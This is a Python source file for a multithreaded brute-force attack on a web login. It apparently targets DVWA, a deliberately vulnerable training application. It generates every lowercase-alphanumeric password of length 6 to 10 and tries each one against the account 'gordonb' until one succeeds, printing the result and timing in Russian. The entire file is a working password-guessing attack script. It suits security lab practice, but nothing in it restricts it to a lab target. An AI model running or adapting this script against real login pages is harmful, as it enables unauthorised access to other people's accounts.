import threading
import time
from itertools import product
import math
from networking import NetworkUtil

class GenerationUtil:
    letters = 'abcdefghijklmnopqrstuvwxyz0123456789'
    char_set_length = len(letters)
    min_length = 6
    max_length = 10

    def __init__(self, base_url, user_token, thread_count, network_util):
        self.base_url = base_url
        self.user_token = user_token
        self.thread_count = thread_count
        self.network_util = network_util
        self.found_password = None
        self.lock = threading.Lock()

    def _generate_password(self, index, length):
        password = []
        for _ in range(length):
            password.append(self.letters[index % self.char_set_length])
            index //= self.char_set_length
        return ''.join(reversed(password))

    def _worker(self, start_length, max_length, thread_index, total_threads):
        for length in range(start_length, max_length + 1):
            total_combinations = math.pow(self.char_set_length, length)

            for index in range(thread_index, int(total_combinations), total_threads):
                if self.found_password is not None:
                    return

                password = self._generate_password(index, length)

                success = self.network_util.attempt_login(
                    self.base_url, 'gordonb', password, self.user_token
                )

                if success:
                    with self.lock:
                        if self.found_password is None:
                            self.found_password = password
                            return

    def brute_force_dvwa(self):
        threads = []
        start_time = time.time()

        for i in range(self.thread_count):
            thread = threading.Thread(
                target=self._worker,
                args=(self.min_length, self.max_length, i, self.thread_count)
            )
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

        end_time = time.time()

        if self.found_password:
            print(f'Пароль найден: {self.found_password}')
        else:
            print('Пароль не найден.')

        print(f'Время выполнения: {end_time - start_time:.2f} секунд')